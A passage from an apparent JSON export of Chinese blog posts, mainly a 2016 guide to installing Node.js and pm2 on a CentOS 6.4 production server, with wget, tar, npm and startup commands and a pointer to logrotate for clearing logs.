\u7248\u672c\u3002\n<\/p>\n<\/div>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-6\" class=\"outline-2\">\n<h2 id=\"sec-6\">\u53c2\u8003<\/h2>\n<div class=\"outline-text-2\" id=\"text-6\">\n<p>\n<a href=\"http:\/\/pm2.keymetrics.io\/docs\/usage\/pm2-doc-single-page\/\">PM2 - One page documentation<\/a><\/p>\n<\/div>\n<\/div>\n"
},
{
  "title": "CentOS 6.4 \u751f\u4ea7\u73af\u5883\u4e0a\u5b89\u88c5 pm2",
  "timestamp": "2016-02-25 17:27:00",
  "tags": [
    "node",
    "linux"
  ],
  "body": "<p>\n\u786e\u4fdd\u7cfb\u7edf\u8981\u5e72\u51c0\uff08\u5c1a\u672a\u5b89\u88c5 node.js\uff09\uff0c\u4f7f\u7528 root \u5e10\u53f7\u767b\u5f55\u3002\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u5b89\u88c5 LTS \u7248\u7684 node.js\n\n<p>\n\u5f53\u524d <a href=\"https:\/\/nodejs.org\/en\/\">\u5b98\u65b9<\/a> \u63a8\u8350\u7684 LTS \u7248\u672c\u4e3a v4.3.1\uff0c\u901a\u8fc7\u6dd8\u5b9d\u955c\u50cf\u4e0b\u8f7d\u901f\u5ea6\u5feb\u4e00\u4e9b\uff0c\u76f4\u63a5\u5b89\u88c5\u5728\u7cfb\u7edf\u76ee\u5f55\u4e2d \/usr \u4e0b\uff0c\u4fbf\u4e8e\u4f7f\u7528\u3002\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">wget http:\/\/npm.taobao.org\/mirrors\/node\/latest-v4.x\/node-v4.3.1-linux-x64.tar.xz\ntar xJvf node-v4.3.1-linux-x64.tar.xz --no-same-owner --exclude CHANGELOG.md --e<span style=\"text-decoration: underline;\">xclude LICENSE --exclude README.md --strip-components 1 -C \/usr<\/span>\n<\/pre>\n<\/div>\n\n<p>\n\u53c2\u8003\uff1a<a href=\"https:\/\/gist.github.com\/TooTallNate\/2477f53a23a51537332e\">Install Node.js one-liner<\/a>\n<\/p>\n<\/li>\n\n<li>\u5b89\u88c5\u7a33\u5b9a\u7248 pm2\n\n<p>\n\u4ece <a href=\"https:\/\/github.com\/Unitech\/pm2\/blob\/master\/CHANGELOG.md\">CHANGELOG.md<\/a> \u67e5\u5230\u7684\u5f53\u524d\u7684\u7a33\u5b9a\u7248\u672c\u4e3a v0.14.3\uff0cpm2 \u53d1\u5e03\u5f88\u9891\u7e41,\u4e0d\u5b9c\u8ffd\u65b0\u3002\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">npm install pm2@0.14.3 -g\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u8bbe\u7f6e pm2 \u4e3a\u5f00\u673a\u542f\u52a8\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">pm2 startup centos\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u5b9a\u671f\u6e05\u7406\u65e5\u5fd7\n\n<p>\n\u6309\u300a <a href=\"http:\/\/blog.kankanan.com\/article\/pm2-768465e55fd77ba17406.html#sec-6\">pm2\u7684\u65e5\u5fd7\u7ba1\u7406<\/a> \u300b\u4e2d\u7684\u201c\u5b9a\u671f\u6e05\u7406\u65e5\u5fd7\u201d\u4e00\u8282\u6240\u8ff0\u4f7f\u7528 logrotate \u670d\u52a1\u5b9a\u671f\u6e05\u7406\u65e5\u5fd7\u3002<\/p>\n<\/li>\n<\/ul>\n"
}]